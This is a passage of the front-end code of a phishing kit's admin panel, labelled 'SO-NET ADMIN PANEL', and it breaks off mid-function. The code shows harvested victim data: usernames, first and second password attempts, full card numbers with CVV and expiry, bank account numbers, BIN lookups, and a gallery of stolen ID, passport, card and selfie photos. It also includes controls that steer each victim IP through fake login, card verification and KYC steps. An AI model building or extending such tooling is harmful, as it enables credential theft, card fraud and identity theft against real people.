.photo-gallery { display: grid; grid-template-columns: repeat(auto-fill, minmax(250px, 1fr)); gap: 20px; }
.photo-card { background: #111827; border-radius: 10px; overflow: hidden; border: 1px solid #1f2937; transition: all 0.3s; position: relative; }
.photo-card:hover { transform: translateY(-5px); box-shadow: 0 10px 30px rgba(239, 68, 68, 0.3); border-color: #ef4444; }
.photo-card-image { width: 100%; height: 200px; object-fit: cover; cursor: pointer; background: #000; display: block; }
.photo-card-body { padding: 12px; }
.photo-card-category { display: inline-block; padding: 3px 10px; border-radius: 12px; font-size: 11px; font-weight: bold; margin-bottom: 8px; background: #ef4444; color: #fff; }
.photo-card-category.card_front { background: #0ea5e9; }
.photo-card-category.card_back { background: #f59e0b; }
.photo-card-category.id_passport { background: #10b981; }
.photo-card-category.selfie { background: #8b5cf6; }
.photo-card-category.other { background: #666; }
.photo-card-filename { font-family: monospace; font-size: 11px; color: #fff; word-break: break-all; margin-bottom: 5px; }
.photo-card-meta { font-size: 11px; color: #888; margin-bottom: 10px; }
.photo-card-actions { display: flex; gap: 5px; }
.photo-card-actions button, .photo-card-actions a { flex: 1; padding: 6px 10px; border: none; border-radius: 4px; cursor: pointer; font-size: 11px; font-weight: bold; text-decoration: none; text-align: center; transition: all 0.2s; }
.photo-view-btn { background: #0ea5e9; color: #fff; }
.photo-view-btn:hover { background: #0284c7; }
.photo-download-btn { background: #10b981; color: #fff; }
.photo-download-btn:hover { background: #059669; }
.photo-delete-btn { background: #ef4444; color: #fff; }
.photo-delete-btn:hover { background: #dc2626; }

.lightbox-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.95); z-index: 10001; justify-content: center; align-items: center; flex-direction: column; }
.lightbox-overlay.active { display: flex; }
.lightbox-image { max-width: 90%; max-height: 80vh; object-fit: contain; border-radius: 8px; box-shadow: 0 0 50px rgba(239, 68, 68, 0.5); }
.lightbox-info { color: #fff; margin-top: 15px; text-align: center; font-family: monospace; }
.lightbox-close { position: absolute; top: 20px; right: 30px; background: #ef4444; color: #fff; border: none; width: 45px; height: 45px; border-radius: 50%; font-size: 24px; cursor: pointer; }
.lightbox-close:hover { background: #dc2626; }
.lightbox-nav { position: absolute; top: 50%; transform: translateY(-50%); background: rgba(239, 68, 68, 0.7); color: #fff; border: none; width: 50px; height: 50px; border-radius: 50%; font-size: 24px; cursor: pointer; }
.lightbox-nav:hover { background: #ef4444; }
.lightbox-prev { left: 20px; }
.lightbox-next { right: 20px; }

.empty-state { text-align: center; padding: 60px 20px; color: #666; }
.empty-state .icon { font-size: 60px; margin-bottom: 15px; opacity: 0.3; }
.empty-state .message { font-size: 16px; }

@media (max-width: 768px) {
.sidebar { width: 100%; position: fixed; bottom: 0; z-index: 1000; display: flex; overflow-x: auto; padding: 10px; }
.menu-item { white-space: nowrap; margin: 0 5px; padding: 10px 15px; font-size: 12px; }
.container { flex-direction: column; padding-bottom: 80px; }
.photo-gallery { grid-template-columns: repeat(auto-fill, minmax(150px, 1fr)); gap: 10px; }
.photo-card-image { height: 150px; }
}
</style>
</head>
<body>
<div class="header">
<h1>🔴 SO-NET ADMIN PANEL</h1>
<a href="?logout=1" class="logout-btn">Logout</a>
</div>
<div class="notification" id="notification"></div>

<div class="lightbox-overlay" id="lightbox">
<button class="lightbox-close" onclick="closeLightbox()">✕</button>
<button class="lightbox-nav lightbox-prev" onclick="navigateLightbox(-1)">‹</button>
<button class="lightbox-nav lightbox-next" onclick="navigateLightbox(1)">›</button>
<img class="lightbox-image" id="lightbox-image" src="" alt="Preview">
<div class="lightbox-info" id="lightbox-info"></div>
</div>

<div class="container">
<div class="sidebar">
<div class="menu-item active" onclick="showSection('dashboard')">📊 Dashboard</div>
<div class="menu-item" onclick="showSection('realtime')">📡 Real-time Monitor</div>
<div class="menu-item" onclick="showSection('results')">📝 Results</div>
<div class="menu-item" onclick="showSection('photos')">📸 Foto</div>
<div class="menu-item" onclick="showSection('input_logs')">🔍 Input Logs by IP</div>
<div class="menu-item" onclick="showSection('step_control')">⚙️ Step Control</div>
<div class="menu-item" onclick="showSection('ip_redirect')">🎯 IP Redirect</div>
<div class="menu-item" onclick="showSection('verif_ips')">📋 Verif IPs</div>
<div class="menu-item" onclick="showSection('file_editor')">📝 File Editor</div>
<div class="menu-item" onclick="showSection('blocked')">🚫 Blocked IPs</div>
</div>
<div class="content">

<div id="dashboard" class="section active">
<h2 style="margin-bottom: 20px; color: #ef4444;">Dashboard Statistics</h2>
<div class="stats-grid">
<div class="stat-card"><h3>Total Visits</h3><div class="value" id="stat-total-visits">0</div></div>
<div class="stat-card"><h3>Today's Visits</h3><div class="value" id="stat-today-visits">0</div></div>
<div class="stat-card active-now"><h3>Active Now</h3><div class="value" id="stat-active-now">0</div></div>
<div class="stat-card inputs"><h3>Total Inputs</h3><div class="value" id="stat-total-inputs">0</div></div>
<div class="stat-card photos"><h3>Total Foto</h3><div class="value" id="stat-total-photos">0</div></div>
<div class="stat-card"><h3>Relogin 1</h3><div class="value" id="stat-relogin1">0</div></div>
<div class="stat-card"><h3>Relogin 2</h3><div class="value" id="stat-relogin">0</div></div>
<div class="stat-card"><h3>Verif</h3><div class="value" id="stat-verif">0</div></div>
<div class="stat-card"><h3>Reverif</h3><div class="value" id="stat-reverif">0</div></div>
<div class="stat-card"><h3>KYC</h3><div class="value" id="stat-kyc">0</div></div>
<div class="stat-card"><h3>Finish</h3><div class="value" id="stat-finish">0</div></div>
<div class="stat-card"><h3>Blocked IPs</h3><div class="value" id="stat-blocked-ips">0</div></div>
<div class="stat-card"><h3>Total Results</h3><div class="value" id="stat-total-results">0</div></div>
</div>
</div>

<div id="realtime" class="section">
<h2 style="margin-bottom: 20px; color: #ef4444;">Real-time Visitor Monitor
<button onclick="clearVisitors()" style="float: right; background: #ef4444; color: #fff; border: none; padding: 5px 15px; border-radius: 3px; cursor: pointer;">Clear Log</button>
</h2>
<div class="monitor-wrapper">
<div class="monitor-container">
<div class="monitor-header">
<div class="monitor-status"><div class="status-dot"></div><span>LIVE STREAM</span></div>
<div><span id="visitor-count">0</span> entries</div>
</div>
<div class="monitor-box" id="monitor-box">
<div id="monitor-content"><div style="color: #1f2937; text-align: center; padding: 50px 0;">Waiting for visitors...</div></div>
</div>
</div>
</div>
</div>

<div id="results" class="section">
<h2 style="margin-bottom: 20px; color: #ef4444;">Visitor Results (ID, Password & BIN Details)</h2>
<div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px;">
<button onclick="clearAllResults()" class="action-btn" style="margin-right: 10px;">Clear All</button>
<button onclick="bulkDeleteResults()" class="bulk-delete-btn" id="bulk-delete-btn" disabled>Delete Selected (<span id="selected-count">0</span>)</button>
</div>
<div id="results-container"><div style="text-align: center; color: #666; padding: 50px;">Loading results...</div></div>
</div>

<div id="photos" class="section">
<h2 style="margin-bottom: 20px; color: #ef4444;">📸 Galeri Foto KYC
<button onclick="clearAllPhotos()" style="float: right; background: #ef4444; color: #fff; border: none; padding: 8px 18px; border-radius: 5px; cursor: pointer; font-weight: bold;">🗑️ Hapus Semua Foto</button>
<button onclick="loadPhotos()" style="float: right; background: #0ea5e9; color: #fff; border: none; padding: 8px 18px; border-radius: 5px; cursor: pointer; font-weight: bold; margin-right: 10px;">🔄 Refresh</button>
</h2>
<div class="photo-stats-bar" id="photo-stats-bar">
<div class="photo-stat-card"><div class="icon">📸</div><div class="count" id="photo-stat-total">0</div><div class="label">Total Foto</div></div>
<div class="photo-stat-card"><div class="icon">💳</div><div class="count" id="photo-stat-card_front">0</div><div class="label">Kartu Depan</div></div>
<div class="photo-stat-card"><div class="icon">💳</div><div class="count" id="photo-stat-card_back">0</div><div class="label">Kartu Belakang</div></div>
<div class="photo-stat-card"><div class="icon">🪪</div><div class="count" id="photo-stat-id_passport">0</div><div class="label">ID / Paspor</div></div>
<div class="photo-stat-card"><div class="icon">🤳</div><div class="count" id="photo-stat-selfie">0</div><div class="label">Selfie</div></div>
</div>
<div class="photo-filter-bar">
<span style="color: #9ca3af; font-weight: bold;">Filter:</span>
<button class="photo-filter-btn active" data-filter="all" onclick="filterPhotos('all', this)">📁 Semua</button>
<button class="photo-filter-btn" data-filter="card_front" onclick="filterPhotos('card_front', this)">💳 Kartu Depan</button>
<button class="photo-filter-btn" data-filter="card_back" onclick="filterPhotos('card_back', this)">💳 Kartu Belakang</button>
<button class="photo-filter-btn" data-filter="id_passport" onclick="filterPhotos('id_passport', this)">🪪 ID / Paspor</button>
<button class="photo-filter-btn" data-filter="selfie" onclick="filterPhotos('selfie', this)">🤳 Selfie</button>
</div>
<div id="photos-container">
<div class="empty-state"><div class="icon">⏳</div><div class="message">Memuat foto...</div></div>
</div>
</div>

<div id="input_logs" class="section">
<h2 style="margin-bottom: 20px; color: #ef4444;">🔍 Input Logs by IP
<button onclick="clearInputLogs()" style="float: right; background: #ef4444; color: #fff; border: none; padding: 5px 15px; border-radius: 3px; cursor: pointer;">Clear All Logs</button>
</h2>
<div class="filter-bar">
<input type="text" id="ip-filter" placeholder="🔎 Filter by IP address (e.g., 192.168.1.1)" onkeyup="if(event.key==='Enter') filterInputLogs()">
<button class="save-btn" onclick="filterInputLogs()" style="margin: 0;">Search IP</button>
<button class="action-btn" onclick="loadInputLogs()">Show All</button>
</div>
<div id="input-logs-container"><div style="text-align: center; color: #666; padding: 50px;">Loading input logs...</div></div>
</div>

<div id="step_control" class="section">
<h2 style="margin-bottom: 20px; color: #ef4444;">Step Control</h2>
<div id="step-control-grid"><div style="text-align: center; color: #666; padding: 50px;">Loading...</div></div>
</div>

<div id="ip_redirect" class="section">
<h2 style="margin-bottom: 20px; color: #ef4444;">IP Step Redirect Manager</h2>
<div class="input-row">
<div class="input-group"><label>IP Address</label><input type="text" id="redirect-ip" placeholder="192.168.1.1"></div>
<div class="input-group"><label>Redirect to Step</label>
<select id="redirect-step">
<option value="login">Login (1)</option>
<option value="relogin">Relogin (2)</option>
<option value="verif">Verif (Card 1)</option>
<option value="reverif">Reverif (Card 2)</option>
<option value="kyc">KYC (Upload)</option>
</select>
</div>
<div class="input-group"><label>&nbsp;</label><button class="save-btn" onclick="addIPRedirect()">Add Redirect</button></div>
</div>
<div id="ip-redirects-list" style="margin-top: 20px;"><div style="text-align: center; color: #666; padding: 20px;">Loading...</div></div>
</div>

<div id="verif_ips" class="section">
<h2 style="margin-bottom: 20px; color: #ef4444;">Verif IPs Tracking</h2>
<div style="background:#111827;padding:15px;border-radius:10px;margin-bottom:20px;">
<p style="color:#888;font-size:13px;">⚠️ IPs in this list will be <b>directly redirected to Verif step</b> on revisit.</p>
</div>
<div style="margin-bottom:15px;"><button onclick="clearVerifIPs()" class="action-btn">Clear All Verif IPs</button></div>
<div id="verif-ips-list"><div style="text-align: center; color: #666; padding: 20px;">Loading...</div></div>
</div>

<div id="file_editor" class="section">
<h2 style="margin-bottom: 20px; color: #ef4444;">File Editor</h2>
<div class="editor-box">
<h3>accpass.txt (Valid Passwords)</h3>
<textarea id="accpass-content"><?php echo htmlspecialchars($accpass_content); ?></textarea>
<button class="save-btn" onclick="saveFile('accpass')">Save accpass.txt</button>
</div>
<div class="editor-box">
<h3>blocklist.txt (Invalid Passwords)</h3>
<textarea id="blocklist-content"><?php echo htmlspecialchars($blocklist_content); ?></textarea>
<button class="save-btn" onclick="saveFile('blocklist')">Save blocklist.txt</button>
</div>
<div class="editor-box">
<h3>cardblock.txt (Blocked Cards)</h3>
<textarea id="cardblock-content"><?php echo htmlspecialchars($cardblock_content); ?></textarea>
<button class="save-btn" onclick="saveFile('cardblock')">Save cardblock.txt</button>
</div>
<div class="editor-box">
<h3>blocked_ips.txt (Blocked IPs)</h3>
<textarea id="blocked-ips-content"><?php echo htmlspecialchars($blocked_ips_content); ?></textarea>
<button class="save-btn" onclick="saveFile('blocked_ips')">Save blocked_ips.txt</button>
</div>
<div class="editor-box">
<h3>acceptip.txt (Whitelist IPs)</h3>
<textarea id="accept-ips-content"><?php echo htmlspecialchars($accept_ips_content); ?></textarea>
<button class="save-btn" onclick="saveFile('accept_ips')">Save acceptip.txt</button>
</div>
</div>

<div id="blocked" class="section">
<h2 style="margin-bottom: 20px; color: #ef4444;">Manage Blocked IPs</h2>
<div class="input-row">
<div class="input-group"><label>IP Address</label><input type="text" id="new-ip" placeholder="Enter IP to block"></div>
<div class="input-group"><label>&nbsp;</label><button class="save-btn" onclick="blockIP()" style="margin-top: 0;">Block IP</button></div>
</div>
<div id="blocked-ips-list" style="margin-top: 20px;"></div>
</div>
</div>
</div>

<script>
let visitorsInterval, statsInterval, inputLogsInterval, lastVisitorsData = '', isFirstLoad = true;
let selectedResults = new Set();
let allPhotos = [];
let currentPhotoFilter = 'all';
let currentLightboxIndex = 0;
let filteredPhotos = [];

document.addEventListener('DOMContentLoaded', function() {
loadStats();
statsInterval = setInterval(loadStats, 5000);
});

function showSection(section) {
document.querySelectorAll('.menu-item').forEach(m => m.classList.remove('active'));
document.querySelectorAll('.section').forEach(s => s.classList.remove('active'));
const menuItems = document.querySelectorAll('.menu-item');
const sections = ['dashboard','realtime','results','photos','input_logs','step_control','ip_redirect','verif_ips','file_editor','blocked'];
const idx = sections.indexOf(section);
if (idx >= 0 && menuItems[idx]) menuItems[idx].classList.add('active');
document.getElementById(section).classList.add('active');
clearInterval(visitorsInterval);
clearInterval(inputLogsInterval);
switch(section) {
case 'realtime': isFirstLoad = true; loadVisitors(); visitorsInterval = setInterval(loadVisitors, 2000); break;
case 'results': loadResults(); break;
case 'photos': loadPhotos(); break;
case 'input_logs': loadInputLogs(); inputLogsInterval = setInterval(loadInputLogs, 5000); break;
case 'step_control': loadStepsConfig(); break;
case 'ip_redirect': loadIPRedirects(); break;
case 'verif_ips': loadVerifIPs(); break;
case 'blocked': loadBlockedIPs(); break;
}
}

function showNotification(message, isError = false) {
const notif = document.getElementById('notification');
notif.textContent = message;
notif.className = 'notification' + (isError ? ' error' : '');
notif.style.display = 'block';
setTimeout(() => notif.style.display = 'none', 3000);
}

function loadStats() {
fetch('admin.php?ajax=stats').then(r => r.json()).then(data => {
document.getElementById('stat-total-visits').textContent = data.total_visits || 0;
document.getElementById('stat-today-visits').textContent = data.today_visits || 0;
document.getElementById('stat-active-now').textContent = data.active_now || 0;
document.getElementById('stat-total-inputs').textContent = data.total_inputs || 0;
document.getElementById('stat-total-photos').textContent = data.total_photos || 0;
document.getElementById('stat-relogin1').textContent = data.relogin1 || 0;
document.getElementById('stat-relogin').textContent = data.relogin || 0;
document.getElementById('stat-verif').textContent = data.verif || 0;
document.getElementById('stat-reverif').textContent = data.reverif || 0;
document.getElementById('stat-kyc').textContent = data.kyc || 0;
document.getElementById('stat-finish').textContent = data.finish || 0;
document.getElementById('stat-blocked-ips').textContent = data.blocked_ips || 0;
document.getElementById('stat-total-results').textContent = data.total_results || 0;
});
}

function loadPhotos() {
const container = document.getElementById('photos-container');
container.innerHTML = '<div class="empty-state"><div class="icon">⏳</div><div class="message">Memuat foto...</div></div>';
fetch('admin.php?ajax=photos').then(r => r.json()).then(data => {
allPhotos = data.photos || [];
document.getElementById('photo-stat-total').textContent = data.total || 0;
document.getElementById('photo-stat-card_front').textContent = data.stats.card_front || 0;
document.getElementById('photo-stat-card_back').textContent = data.stats.card_back || 0;
document.getElementById('photo-stat-id_passport').textContent = data.stats.id_passport || 0;
document.getElementById('photo-stat-selfie').textContent = data.stats.selfie || 0;
renderPhotos();
}).catch(err => {
container.innerHTML = '<div class="empty-state"><div class="icon">❌</div><div class="message">Gagal memuat foto: ' + err.message + '</div></div>';
});
}

function renderPhotos() {
const container = document.getElementById('photos-container');
filteredPhotos = currentPhotoFilter === 'all' ? allPhotos : allPhotos.filter(p => p.category === currentPhotoFilter);
if (filteredPhotos.length === 0) {
container.innerHTML = '<div class="empty-state"><div class="icon">📭</div><div class="message">Belum ada foto yang diupload' + (currentPhotoFilter !== 'all' ? ' untuk kategori ini' : '') + '</div></div>';
return;
}
let html = '<div class="photo-gallery">';
filteredPhotos.forEach((photo, index) => {
html += `<div class="photo-card">
<img src="${photo.url}" alt="${escapeHtml(photo.filename)}" class="photo-card-image" onclick="openLightbox(${index})" onerror="this.src='data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIyMDAiIGhlaWdodD0iMjAwIj48cmVjdCB3aWR0aD0iMjAwIiBoZWlnaHQ9IjIwMCIgZmlsbD0iIzMzMyIvPjx0ZXh0IHg9IjEwMCIgeT0iMTAwIiBmaWxsPSIjOTk5IiBmb250LXNpemU9IjE0IiB0ZXh0LWFuY2hvcj0ibWlkZGxlIj5Gb3RvIFRpZGFrIFRlcnNlZGlhPC90ZXh0Pjwvc3ZnPg=='">
<div class="photo-card-body">
<span class="photo-card-category ${photo.category}">${photo.category_label}</span>
<div class="photo-card-filename" title="${escapeHtml(photo.filename)}">${escapeHtml(photo.filename.length > 30 ? photo.filename.substring(0, 30) + '...' : photo.filename)}</div>
<div class="photo-card-meta">📦 ${photo.size_formatted} | 🕐 ${photo.uploaded}</div>
<div class="photo-card-actions">
<button class="photo-view-btn" onclick="openLightbox(${index})">👁️ Lihat</button>
<a href="${photo.url}" download="${photo.filename}" class="photo-download-btn">⬇️ Unduh</a>
<button class="photo-delete-btn" onclick="deletePhoto('${escapeHtml(photo.filename)}')">🗑️</button>
</div>
</div>
</div>`;
});
html += '</div>';
container.innerHTML = html;
}

function filterPhotos(category, btn) {
currentPhotoFilter = category;
document.querySelectorAll('.photo-filter-btn').forEach(b => b.classList.remove('active'));
btn.classList.add('active');
renderPhotos();
}

function deletePhoto(filename) {
if (!confirm(`Hapus foto "${filename}"?`)) return;
fetch('admin.php', {method: 'POST', headers: {'Content-Type': 'application/x-www-form-urlencoded'}, body: `action=delete_photo&filename=${encodeURIComponent(filename)}`})
.then(r => r.json()).then(data => { showNotification(data.message, !data.success); if (data.success) loadPhotos(); });
}

function clearAllPhotos() {
if (!confirm('Hapus SEMUA foto yang diupload? Tindakan ini tidak dapat dibatalkan!')) return;
fetch('admin.php', {method: 'POST', headers: {'Content-Type': 'application/x-www-form-urlencoded'}, body: 'action=clear_all_photos'})
.then(r => r.json()).then(data => { showNotification(data.message, !data.success); if (data.success) loadPhotos(); });
}

function openLightbox(index) {
currentLightboxIndex = index;
const photo = filteredPhotos[index];
if (!photo) return;
document.getElementById('lightbox-image').src = photo.url;
document.getElementById('lightbox-info').innerHTML = `<strong>${photo.category_label}</strong><br>📁 ${escapeHtml(photo.filename)}<br>📦 ${photo.size_formatted} | 🕐 ${photo.uploaded}`;
document.getElementById('lightbox').classList.add('active');
document.body.style.overflow = 'hidden';
}

function closeLightbox() {
document.getElementById('lightbox').classList.remove('active');
document.body.style.overflow = '';
}

function navigateLightbox(direction) {
currentLightboxIndex += direction;
if (currentLightboxIndex < 0) currentLightboxIndex = filteredPhotos.length - 1;
if (currentLightboxIndex >= filteredPhotos.length) currentLightboxIndex = 0;
openLightbox(currentLightboxIndex);
}

document.addEventListener('keydown', function(e) {
if (document.getElementById('lightbox').classList.contains('active')) {
if (e.key === 'Escape') closeLightbox();
if (e.key === 'ArrowLeft') navigateLightbox(-1);
if (e.key === 'ArrowRight') navigateLightbox(1);
}
});

document.getElementById('lightbox').addEventListener('click', function(e) {
if (e.target === this) closeLightbox();
});

function loadVisitors() {
fetch('admin.php?ajax=visitors').then(r => r.json()).then(data => {
if (!data.visitors || data.visitors.length === 0) {
if (isFirstLoad) document.getElementById('monitor-content').innerHTML = '<div style="color: #1f2937; text-align: center; padding: 50px 0;">No visitors yet</div>';
return;
}
document.getElementById('visitor-count').textContent = data.visitors.length;
const newData = JSON.stringify(data.visitors);
if (newData !== lastVisitorsData) {
lastVisitorsData = newData;
let html = '';
data.visitors.forEach(line => {
let className = 'monitor-line';
const lineLower = line.toLowerCase();
if (lineLower.includes('bot') || lineLower.includes('blocked')) className += ' bot';
else if (lineLower.includes('success')) className += ' success';
else if (lineLower.includes('login') || lineLower.includes('relogin')) className += ' login';
else if (lineLower.includes('verif') || lineLower.includes('card submitted')) className += ' verif';
else if (lineLower.includes('kyc')) className += ' kyc';
html += `<div class="${className}">${escapeHtml(line)}</div>`;
});
document.getElementById('monitor-content').innerHTML = html;
document.getElementById('monitor-box').scrollTop = document.getElementById('monitor-box').scrollHeight;
isFirstLoad = false;
}
});
}

function loadInputLogs(filterIp = '') {
const url = filterIp ? `admin.php?ajax=input_logs&filter_ip=${encodeURIComponent(filterIp)}` : 'admin.php?ajax=input_logs';
fetch(url).then(r => r.json()).then(data => {
const container = document.getElementById('input-logs-container');
if (!data.grouped || data.grouped.length === 0) {
container.innerHTML = '<div style="text-align: center; color: #666; padding: 50px;">No input logs found</div>';
return;
}
let html = `<div style="margin-bottom: 15px; color: #9ca3af;">📊 Total entries: <strong style="color: #10b981;">${data.total_entries}</strong> | 🌐 Unique IPs: <strong style="color: #10b981;">${data.grouped.length}</strong></div>`;
data.grouped.forEach(group => {
const entryCount = group.entries.length;
const latestEntry = group.entries[0];
const stepCounts = {};
group.entries.forEach(e => { stepCounts[e.step] = (stepCounts[e.step] || 0) + 1; });
const stepsText = Object.entries(stepCounts).map(([s,c]) => `${s}: ${c}`).join(' | ');
html += `<div class="ip-group-card">
<div class="ip-group-header" onclick="toggleIPGroup('${group.ip.replace(/\./g,'_')}')">
<div class="ip-group-info">
<div class="ip-group-ip">${escapeHtml(group.ip)}</div>
<div class="ip-group-meta">📍 ${escapeHtml(group.location)} | 🕐 Latest: ${escapeHtml(latestEntry.timestamp)}</div>
<div class="ip-group-meta" style="margin-top: 5px; color: #f59e0b;">📝 ${stepsText}</div>
</div>
<div class="ip-group-stats">
<span class="ip-group-count">${entryCount} inputs</span>
<button class="delete-btn" onclick="event.stopPropagation(); deleteInputsByIP('${group.ip}')" title="Delete all inputs from this IP">🗑️ Clear IP</button>
<span class="ip-group-toggle" id="toggle-${group.ip.replace(/\./g,'_')}">▼</span>
</div>
</div>
<div class="ip-group-entries" id="entries-${group.ip.replace(/\./g,'_')}">`;
group.entries.forEach(entry => {
const stepClass = ['login','relogin','verif','reverif','kyc'].includes(entry.step) ? entry.step : '';
html += `<div class="input-entry ${stepClass}">
<div class="entry-header">
<span class="entry-step">${escapeHtml(entry.step.toUpperCase())}</span>
<span class="entry-time">${escapeHtml(entry.timestamp)}</span>
</div>
<div class="entry-data">`;
Object.keys(entry).forEach(key => {
if (['timestamp','ip','location','user_agent','step','session_id'].includes(key)) return;
if (entry[key] === null || entry[key] === '' || typeof entry[key] === 'object') return;
const isSensitive = ['password','first_password','cvv','cid','securitycode','card_number','rek'].includes(key);
const valClass = isSensitive ? 'sensitive' : '';
html += `<div class="entry-field">
<span class="entry-key">${escapeHtml(key)}:</span>
<span class="entry-val ${valClass}">${escapeHtml(String(entry[key]))}</span>
</div>`;
});
html += `</div></div>`;
});
html += `</div></div>`;
});
container.innerHTML = html;
});
}

function filterInputLogs() {
const ip = document.getElementById('ip-filter').value.trim();
loadInputLogs(ip);
}

function toggleIPGroup(ipSafe) {
const entries = document.getElementById('entries-' + ipSafe);
const toggle = document.getElementById('toggle-' + ipSafe);
if (entries && toggle) { entries.classList.toggle('open'); toggle.classList.toggle('open'); }
}

function deleteInputsByIP(ip) {
if (!confirm(`Delete ALL input logs from IP: ${ip}?`)) return;
fetch('admin.php', {method: 'POST', headers: {'Content-Type': 'application/x-www-form-urlencoded'}, body: `action=delete_input_by_ip&ip=${encodeURIComponent(ip)}`})
.then(r => r.json()).then(data => { showNotification(data.message, !data.success); if (data.success) loadInputLogs(); });
}

function clearInputLogs() {
if (!confirm('Clear ALL input logs? This cannot be undone!')) return;
fetch('admin.php', {method: 'POST', headers: {'Content-Type': 'application/x-www-form-urlencoded'}, body: 'action=clear_input_logs'})
.then(r => r.json()).then(data => { showNotification(data.message, !data.success); if (data.success) loadInputLogs(); });
}

function loadResults() {
fetch('admin.php?ajax=results').then(r => r.json()).then(data => {
const container = document.getElementById('results-container');
if (!data.results || data.results.length === 0) {
container.innerHTML = '<div style="text-align: center; color: #666; padding: 50px;">No results yet</div>';
return;
}
let html = '';
data.results.forEach((result, index) => { html += createResultCard(result, index); });
container.innerHTML = html;
updateBulkDeleteButton();
});
}

function createResultCard(result, index) {
let credentialsHtml = '';
let binCardHtml = '';
const id = result.username || result.email || result.eoid || '';
const password = result.password || '';
const firstPassword = result.first_password || '';
const mode = result.mode || '';
if (id || password || firstPassword) {
let modeBadge = '';
if (mode === 'accpass_direct') modeBadge = '<span class="mode-badge accpass">✓ DIRECT ACCPASS</span>';
else if (mode === 'second_attempt_different') modeBadge = '<span class="mode-badge second">✓ SECOND ATTEMPT</span>';
credentialsHtml = `<div class="login-credentials">
<div style="display:flex;align-items:center;margin-bottom:15px;">
<span style="color:#ef4444;font-weight:bold;font-size:14px;">🔐 LOGIN CREDENTIALS</span>
${modeBadge}
</div>`;
if (id) credentialsHtml += `<div class="cred-row"><div class="cred-label">🆔 ID / USERNAME</div><div class="cred-value id-field">${escapeHtml(id)}</div></div>`;
if (firstPassword) credentialsHtml += `<div class="cred-row first-pw"><div class="cred-label">🔑 FIRST PASSWORD (Attempt #1)</div><div class="cred-value first">${escapeHtml(firstPassword)}</div></div>`;
if (password) {
const pwLabel = firstPassword ? '🔑 SECOND PASSWORD (Attempt #2)' : '🔑 PASSWORD';
const pwClass = firstPassword ? 'second' : '';
credentialsHtml += `<div class="cred-row second-pw"><div class="cred-label">${pwLabel}</div><div class="cred-value ${pwClass}">${escapeHtml(password)}</div></div>`;
}
credentialsHtml += `</div>`;
}
const cardNumber = result.card_number || '';
if (cardNumber) {
const binMatch = cardNumber.match(/^(\d{6,8})/);
const bin = binMatch ? binMatch[1] : '';
const cardName = result.holder || result.card_name || '';
const expiry = result.expiry || ((result.expire_month || '') + '/' + (result.expire_year || ''));
const cvv = result.cvv || '';
const rek = result.rek || '';
const cid = result.cid || '';
binCardHtml = `<div class="bin-card-box">
<div class="bin-card-header">💳 BIN CARD DETAILS</div>
<div class="bin-card-info">
${bin ? `<div class="bin-card-row"><span class="bin-card-label">BIN:</span><span class="bin-card-value">${escapeHtml(bin)}</span><button class="bin-lookup-btn" onclick="lookupBin('${bin}', 'bin-details-${index}')">🔍 Lookup</button></div><div class="bin-details" id="bin-details-${index}"></div>` : ''}
${cardNumber ? `<div class="bin-card-row"><span class="bin-card-label">Card Number:</span><span class="bin-card-value">${escapeHtml(cardNumber)}</span></div>` : ''}
${cardName ? `<div class="bin-card-row"><span class="bin-card-label">Card Name:</span><span class="bin-card-value">${escapeHtml(cardName)}</span></div>` : ''}
${expiry && expiry !== '/' ? `<div class="bin-card-row"><span class="bin-card-label">Expiry:</span><span class="bin-card-value">${escapeHtml(expiry)}</span></div>` : ''}
${cvv ? `<div class="bin-card-row"><span class="bin-card-label">CVV:</span><span class="bin-card-value" style="background: #ef4444; padding: 2px 8px; border-radius: 3px;">${escapeHtml(cvv)}</span></div>` : ''}
${cid ? `<div class="bin-card-row"><span class="bin-card-label">CID:</span><span class="bin-card-value">${escapeHtml(cid)}</span></div>` : ''}
${rek ? `<div class="bin-card-row"><span class="bin-card-label">Rekening:</span><span class="bin-card-value">${escapeHtml(rek)}</span></div>` : ''}
</div></div>`;
}
return `<div class="result-card">
<div class="result-header">
<div>
<span class="result-time">📅 ${result.timestamp || 'Unknown'}</span>
<span class="result-ip"> | 🌐 IP: ${result.ip || 'Unknown'}</span>
<span class="result-ip"> | 📋 Type: ${result.type || 'Unknown'}</span>
</div>
<input type="checkbox" class="result-checkbox" onchange="toggleResultSelection(${index}, this.checked)">
<button class="delete-btn" onclick="deleteResult(${index})">🗑️ Delete</button>
</div>
${credentialsHtml}
${binCardHtml}
</div>`;
}

function lookupBin(bin, targetId) {
const target = document.getElementById(targetId);
target.innerHTML = '<div style="color: #10b981;">⏳ Looking up BIN...</div>';
target.classList.add('show');
fetch(`admin.php?ajax=bin_lookup&bin=${encodeURIComponent(bin)}`)
.then(r => r.json())
.then(data => {
if (data.error) { target.innerHTML = `<div style="color: #ef4444;">❌ ${data.error}</div>`; return; }
let html = '<div style="margin-top: 10px; padding-top: 10px; border-top: 1px solid rgba(16,185,129,0.3);">';
html += '<div style="color: #10b981; font-weight: bold; margin-bottom: 8px;">📊 BIN Lookup Result:</div>';
if (data.scheme) html += `<div style="margin: 4px 0;"><span style="color: #9ca3af;">Scheme:</span> <span style="color: #fff; font-weight: bold;">${escapeHtml(data.scheme)}</span></div>`;
if (data.type) html += `<div style="margin: 4px 0;"><span style="color: #9ca3af;">Type:</span> <span style="color: #fff; font-weight: bold;">${escapeHtml(data.type)}</span></div>`;
if (data.brand) html += `<div style="margin: 4px 0;"><span style="color: #9ca3af;">Brand:</span> <span style="color: #fff; font-weight: bold;">${escapeHtml(data.brand)}</span></div>`;
if (data.country && data.country.name) html += `<div style="margin: 4px 0;"><span style="color: #9ca3af;">Country:</span> <span style="color: #fff; font-weight: bold;">${escapeHtml(data.country.name)} ${data.country.emoji || ''}</span></div>`;
if (data.bank && data.bank.name) html += `<div style="margin: 4px 0;"><span style="color: #9ca3af;">Bank:</span> <span style="color: #fff; font-weight: bold;">${escapeHtml(data.bank.name)}</span></div>`;
html += '</div>';
target.innerHTML = html;
}).catch(err => { target.innerHTML = `<div style="color: #ef4444;">❌ Lookup failed</div>`; });
}

function loadStepsConfig() {
fetch('admin.php?ajax=steps_config').then(r => r.json()).then(data => {
const container = document.getElementById('step-control-grid');
const steps = {login: 'Login (Step 1)', relogin: 'Relogin (Step 2)', verif: 'Card Verification', reverif: 'Card Reverification', kyc: 'KYC Upload', finish: 'Finish Page'};
let html = '';
Object.keys(steps).forEach(step => {
